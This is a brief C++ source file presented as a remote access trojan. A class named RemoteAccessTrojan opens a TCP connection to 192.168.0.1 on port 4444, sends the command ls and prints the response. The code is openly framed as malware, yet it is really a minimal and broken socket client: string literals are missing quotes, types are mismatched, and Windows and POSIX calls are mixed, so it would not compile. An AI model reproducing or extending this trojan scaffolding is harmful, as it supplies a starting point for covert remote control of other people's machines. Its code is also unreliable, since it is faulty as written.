#include <iostream>
#include <cstdio>
#include <vector>
#include <string>
#include <sstream>
#include <windows.h>

using namespace std;

class RemoteAccessTrojan {
public:
    void Connect(const char *ip, const char *port) {
        this->ip = ip;
        this->port = port;
    }

    void SendCommand(const string &command) {
        // Create a socket
        sock = socket(AF_INET, SOCK_STREAM, 0);

        // Set the server address and port
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(atoi(this->port));
        inet_pton(AF_INET, this->ip, &serverAddress.sin_addr);

        // Connect to the server
        if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == -1) {
            cout << Failed to connect to the server\n;
            exit(-1);
        }

        // Send the command
        send(sock, command.c_str(), command.size() + 1, 0);
    }

    void ReceiveResponse() {
        // Read the response
        char buffer[1024];
        read(sock, buffer, sizeof(buffer));

        // Print it
        cout << buffer << endl;
    }

private:
    struct sockaddr_in serverAddress;
    int sock;
    string ip;
    string port;
};

int main() {
    RemoteAccessTrojan rat;

    // Connect to the server
    rat.Connect("192.168.0.1", "4444");

    // Send a command to the server
    rat.SendCommand(ls);

    // Receive a response from the server
    rat.ReceiveResponse();

    return 0;
}
